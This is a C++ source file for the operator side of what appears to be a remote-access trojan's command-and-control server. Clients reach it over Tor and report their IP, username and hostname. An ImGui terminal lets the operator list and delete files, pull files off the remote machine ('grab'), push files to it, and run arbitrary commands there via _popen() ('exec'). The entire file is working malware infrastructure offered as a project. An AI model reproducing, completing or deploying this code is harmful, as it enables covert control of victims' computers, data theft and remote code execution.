#include "includeCrap.hpp"

/*
    Class for a connection to the server.
    Decided to put the terminal functions inside this class, hopefully that wasnt a bad idea and it wont    Mostly holds data about the connection.
    Also has useful functions :) become a mess
*/
class connection{
public: // Making everything public temporarily
    int sockFd = -1; // Socket file descriptor - assumed to be valid when the object is created
    struct sockaddr_in address; // Address structure for the client
    int addrlen; // Length of the address
    std::string username;
    std::string hostname;
    std::string publicIp; // Public IP of the client - sent by the client since we can't get it from the socket due to the usage of TOR
    std::mutex sockFdMutex; // Only one thread can use the socket file descriptor at a time
    bool lastConnectivityCheck = false; // Last result of the connectivity check
    bool terminalActive = false; // Whether or not the terminal is being displayed and used
    std::vector<std::string> plainTextMessageHistory; // Elements of this vector are displayed in the terminal
    char inputBuffer[1024] = {0}; // Used for the text input box
    const unsigned int inputBufferSize = 1024; // Size of the input buffer - could probably get rid of this dumb variable
    std::string msgToSend = ""; // This will be derived from the input buffer



    /*
        Constructor/destructor
    */

   
    connection(int sockFd, struct sockaddr_in address, int addrlen){
       this->sockFd = sockFd;
       this->address = address; // !!! Not being used
       this->addrlen = addrlen; // !!! Not being used
    }

    ~connection(){
        this->sockFdMutex.lock();
        close(this->sockFd);
        this->sockFdMutex.unlock();
    }



    /*
        Some GUI stuff
    */


    void drawDebugWindow(){ // Draws some basic debug info to the screen
        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
        ImGui::SetNextWindowSize(ImVec2(25, 6), ImGuiCond_Once);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " debug info").c_str());
        ImGui::Text("Username: %s", this->username.c_str());
        ImGui::Text("Hostname: %s", this->hostname.c_str());
        ImGui::Text("Public IP: %s", this->publicIp.c_str());
        ImGui::Text("Connectivity: %s", (this->lastConnectivityCheck)?"OK":"ERR");
        ImGui::End();
    }

    void drawTerminalWindow(){ // Draws a listbox with the message history, and an inputbox for sending messages
        unsigned int windowWidth = 50;
        unsigned int windowHeight = 25;
        // Put the window in the middle of the screen
        ImGui::SetNextWindowPos(ImVec2((ImGui::GetIO().DisplaySize.x/2)-(windowWidth/2), (ImGui::GetIO().DisplaySize.y/2)-(windowHeight/2)), ImGuiCond_Once);
        ImGui::SetNextWindowSize(ImVec2(windowWidth, windowHeight), ImGuiCond_Once);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " terminal").c_str());
        ImGui::BeginChild("Scrolling", ImVec2(0, -2), false);
        for(auto m : this->plainTextMessageHistory){
            ImGui::TextWrapped("%s", m.c_str());
        }
        if(ImGui::GetScrollY() >= ImGui::GetScrollMaxY()){
            ImGui::SetScrollHereY(1.0f);
        }
        ImGui::EndChild();
        ImGui::Separator();
        ImGui::SetNextItemWidth(ImGui::GetContentRegionAvailWidth());
        if(ImGui::InputText("##Input", this->inputBuffer, this->inputBufferSize, ImGuiInputTextFlags_EnterReturnsTrue)){
            this->msgToSend = std::string(this->inputBuffer);
            memset(this->inputBuffer, 0, this->inputBufferSize);
        }
        // Set the keyboard focus to the input box
        if(!ImGui::IsAnyItemActive() && !ImGui::IsMouseClicked(0)){
            ImGui::SetKeyboardFocusHere();
        }
        ImGui::End();
    }



    /*
        Update/close functions
    */


    // Draws the window and sends messages
    void update(){
        if(this->terminalActive){
            this->drawTerminalWindow();
        }
        if(this->msgToSend != ""){
            this->parseSendCmd(this->msgToSend);
            this->msgToSend = "";
        }

        // Read all the data from the socket (flush it basically)
        this->sockFdMutex.lock();
        char buffer[1024] = {0};
        int bytesReceived = 0;
        int flags = fcntl(this->sockFd, F_GETFL, 0);
        fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
        do{
            bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        }while(bytesReceived > 0);
        fcntl(this->sockFd, F_SETFL, flags);
        this->sockFdMutex.unlock();
    }

    void closeTerminal(){ // Does a little cleanup, ! does not close the socket !
        this->terminalActive = false;
        // Read all the data from the socket to ensure the ping-pong works
        // Do so in non-blocking mode
        char buffer[1024] = {0};
        int bytesReceived = 0;
        int flags = fcntl(this->sockFd, F_GETFL, 0);
        fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
        do{
            bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        }while(bytesReceived > 0);
        fcntl(this->sockFd, F_SETFL, flags);
    }



    /*
        Basic networking functionality
    */


    // Send "ping" to the client, if the client does not respon with "ping;pong;", return false
    bool connectivityCheck(){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, "ping;", 5, 0);
        if(bytesSent != 5){
            this->sockFdMutex.unlock();
            this->lastConnectivityCheck = false;
            return false;
        }
        char buffer[10] = {0};
        int bytesReceived = recv(this->sockFd, buffer, 10, 0);
        if(std::string(buffer) != "ping;pong;"){
            this->sockFdMutex.unlock();
            this->lastConnectivityCheck = false;
            return false;
        }
        this->sockFdMutex.unlock();
        this->lastConnectivityCheck = true;
        return true;
    }

    // Send an std::string to the client. Mostly for testing
    void sendMsgPlaintext(std::string msg){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, msg.c_str(), msg.length(), 0);
        this->sockFdMutex.unlock();
        if(bytesSent < 0){
            this->msgToSend = "Error sending message: " + std::to_string(bytesSent);
            return;
        }
        this->plainTextMessageHistory.push_back("Sent: " + msg);
        this->msgToSend = "";
    }

    // Gets some information from the client and returns true if successful
    bool intialConnection(){
        this->sockFdMutex.lock();
        // Receive the username, hostname, and public IP from the client
        // It must be supplied in the format "ip;username;hostname;"
        char buffer[1024] = {0}; // Should easily be enough space
        int bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        if(bytesReceived < 0){
            return false;
        }
        std::string bufferString = std::string(buffer); // Convert to a string for easier parsing
        if(std::count(bufferString.begin(), bufferString.end(), ';') != 3){
            return false;
        }
        this->publicIp = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->username = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->hostname = bufferString.substr(0, bufferString.find(';'));
        // Send the connection confirmation message to the client
        // <ip>;<username>;<hostname>;connected;
        std::string confirmMsg = this->publicIp + ";" + this->username + ";" + this->hostname + ";connected;";
        int bytesSent = send(this->sockFd, confirmMsg.c_str(), confirmMsg.length(), 0);
        this->sockFdMutex.unlock();
        return true; // TODO: Properly verify the data received is valid
    }



    /*
        Command handling code
    */

    // Available commands (designed for the user):
    // - pwd - sends as "pwd;" - receives response as "pwd;<path>;"
    // - ls - sends as "ls;" - receives response as "ls;<file1>;<file2>;<file3>;"
    // - cd <path> - sends as "cd;<path>;" - receives success as "cd;<path>;" or failure as "cd;error;"
    // - More are TODO, once basic functionality is done

    void parseSendCmd(std::string cmd){
        this->plainTextMessageHistory.push_back("--> " + cmd);
        if(cmd.starts_with("help")){
            this->help();
        }
        else if(cmd.starts_with("pwd")){
            this->pwd();
        }
        else if(cmd.starts_with("ls")){
            this->ls();
        }
        else if(cmd.starts_with("cd ")){
            this->cd(cmd.substr(3));
        }
        else if(cmd.starts_with("rm ")){
            this->rm(cmd.substr(3));
        }
        else if(cmd.starts_with("mkdir ")){
            this->mkdir(cmd.substr(6));
        }
        else if(cmd.starts_with("grab ")){
            this->grab(cmd.substr(5));
        }
        else if(cmd.starts_with("upload ")){
            this->upload(cmd.substr(7));
        }
        else if(cmd.starts_with("exec ")){
            this->exec(cmd.substr(5));
        }
        else{
            this->plainTextMessageHistory.push_back("Unknown command: " + cmd);
        }
    }
    
    void help(){
        this->plainTextMessageHistory.push_back("= Available commands:");
        this->plainTextMessageHistory.push_back("== help - Displays this help message");
        this->plainTextMessageHistory.push_back("== pwd - Displays the current working directory");
        this->plainTextMessageHistory.push_back("== ls - Lists the files in the current working directory");
        this->plainTextMessageHistory.push_back("== cd <path> - Changes the current working directory to <path>");
        this->plainTextMessageHistory.push_back("== rm <path> - Removes the file at <path>");
        this->plainTextMessageHistory.push_back("== mkdir <path> - Creates a directory at <path>");
        this->plainTextMessageHistory.push_back("== grab <path> - Downloads the file at the remote <path> to this machine (at ./)");
        this->plainTextMessageHistory.push_back("== upload <path> - Uploads the file at the local <path> to the remote machine");
        this->plainTextMessageHistory.push_back("== exec <command> - Executes the command on the remote machine via _popen()");
    }

    void genericCmd(std::string cmd){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, cmd.c_str(), cmd.length(), 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }
        // Receive the response from the client
        char cmdRecvBuffer[4096] = {0}; // Ideally this would be dynamic, will do later
        int bytesReceived = recv(this->sockFd, cmdRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }
        std::string cmdRecvBufferString = std::string(cmdRecvBuffer); // Convert to a string for easier parsing
        this->plainTextMessageHistory.push_back(cmdRecvBufferString);
        this->sockFdMutex.unlock();
    }

    void pwd(){
        // Send "pwd;" to the client
        this->sockFdMutex.lock(); // Lock the socket until this command is done
        int bytesSent = send(this->sockFd, "pwd;", 4, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }
        // Receive the response from the client
        char pwdRecvBuffer[4096] = {0}; // Big enough for even the longest path on linux! (windows is a puny 260 characters max lol)
        int bytesReceived = recv(this->sockFd, pwdRecvBuffer, 4096, 0); // Blocking call - maybe figure out a way to prevent issues with this?
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }
        std::string pwdRecvBufferString = std::string(pwdRecvBuffer); // Convert to a string for easier parsing
        if(pwdRecvBufferString.substr(0, 4) != "pwd;"){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format");
            this->sockFdMutex.unlock();
            return;
        }
        pwdRecvBufferString = pwdRecvBufferString.substr(4);
        this->plainTextMessageHistory.push_back(pwdRecvBufferString);
        this->sockFdMutex.unlock(); // Command complete!
    }

    void ls(){
        // Send "ls;" to the client
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, "ls;", 3, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }
        // Receive the response from the client
        char lsRecvBuffer[4096] = {0}; // Ideally this would be dynamic, will do later
        int bytesReceived = recv(this->sockFd, lsRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }
        std::string lsRecvBufferString = std::string(lsRecvBuffer); // Convert to a string for easier parsing
        if(lsRecvBufferString.substr(0, 3) != "ls;"){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format");
            this->sockFdMutex.unlock();
            return;
        }
        lsRecvBufferString = lsRecvBufferString.substr(3);

        // Display the files on the terminal
        std::stringstream ss(lsRecvBufferString);
        std::string f;
        while(getline(ss, f, ';')){
            this->plainTextMessageHistory.push_back(f);
        }

        this->sockFdMutex.unlock();
    }

    void cd(std::string path){
        this->genericCmd("cd;" + path + ";");
    }

    void rm(std::string path){
        this->genericCmd("rm;" + path + ";");
    }

    void mkdir(std::string path){
        this->genericCmd("mkdir;" + path + ";");
    }

    void grab(std::string path){
        this->sockFdMutex.lock();

        // Send the grab command to the client
        int bytesSent = send(this->sockFd, ("grab;" + path + ";").c_str(), path.length() + 6, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }

        // Receive 4096 bytes from the client - this will include the file size and the first chunk of the file (or all of it if it's smaller than 4096 bytes)
        char grabRecvBuffer[4096] = {0};
        unsigned long long int bytesReceivedTotal = 0;
        int bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response to get the file size
        std::string grabRecvBufferString = std::string(grabRecvBuffer); // Cant use this string for any of the file data, because null terminated :(
        if(grabRecvBufferString.substr(0, 5+path.size()+1) != "grab;" + path + ";" || grabRecvBufferString[5+path.size()+2] == '0'){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format or file not found");
            this->sockFdMutex.unlock();
            return;
        }
        unsigned long long int fileSize = std::stoi(grabRecvBufferString.substr(5+path.size()+1)); // !!! unsafe as fuck :( 
        unsigned int headerSize = 5+path.size()+1+std::to_string(fileSize).size()+1; // The size of the "grab;[path];[file size];" thingy :D
        bytesReceivedTotal = bytesReceived - headerSize;

        // Read the file data into an std::vector<char>, receive more data from the socket if the fileSize is greater than what has been received so far
        std::vector<char> fileData;
        fileData.reserve(fileSize);
        fileData.insert(fileData.end(), grabRecvBuffer+headerSize, grabRecvBuffer+bytesReceived);
        while(bytesReceivedTotal < fileSize){
            bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
            if(bytesReceived < 0){
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
                this->sockFdMutex.unlock();
                return;
            }
            fileData.insert(fileData.end(), grabRecvBuffer, grabRecvBuffer+bytesReceived);
            bytesReceivedTotal += bytesReceived;
        }

        // Write the file data to disk
        this->plainTextMessageHistory.push_back("Recieved " + std::to_string(bytesReceivedTotal) + " bytes of data");
        std::ofstream of("./" + path, std::ios::binary); // !!!! unsanitized path, user stupidity could lead to overwriting files
        of.write(fileData.data(), fileData.size());
        of.close();
        this->plainTextMessageHistory.push_back("File written to disk at ./" + path);
        this->sockFdMutex.unlock();
    }

    void upload(std::string path){
        std::ifstream f(path, std::ios::binary);
        if(f.is_open() != true){
            this->plainTextMessageHistory.push_back("ERR: File not found");
        }else{
            this->sockFdMutex.lock();
            std::string header = "upload;" + std::filesystem::path(path).filename().string() + ";" + std::to_string(std::filesystem::file_size(path)) + ";";
            std::vector<char> uploadData;
            uploadData.reserve(header.size() + std::filesystem::file_size(path));
            uploadData.insert(uploadData.end(), header.begin(), header.end());
            uploadData.insert(uploadData.end(), std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>());
            f.close();
            int bytesSent = send(this->sockFd, uploadData.data(), uploadData.size(), 0);
            if(bytesSent < 0){
                this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
                this->sockFdMutex.unlock();
                return;
            }
            this->plainTextMessageHistory.push_back("Sent " + std::to_string(bytesSent) + " bytes of data, waiting for response");
            char responseBuffer[32] = {0};
            int bytesReceived = recv(this->sockFd, responseBuffer, 32, 0);
            if(bytesReceived < 0){
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
                this->sockFdMutex.unlock();
                return;
            }
            this->plainTextMessageHistory.push_back("Response: " + std::string(responseBuffer));
            this->sockFdMutex.unlock();
        }
    }

    void exec(std::string cmd){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, ("exec;" + cmd + ";").c_str(), cmd.length() + 6, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }
        char responseBuffer[4096] = {0}; // This is a stupid hard limit for now
        int bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }
        this->plainTextMessageHistory.push_back("Response: " + std::string(responseBuffer));
        this->sockFdMutex.unlock();
    }


};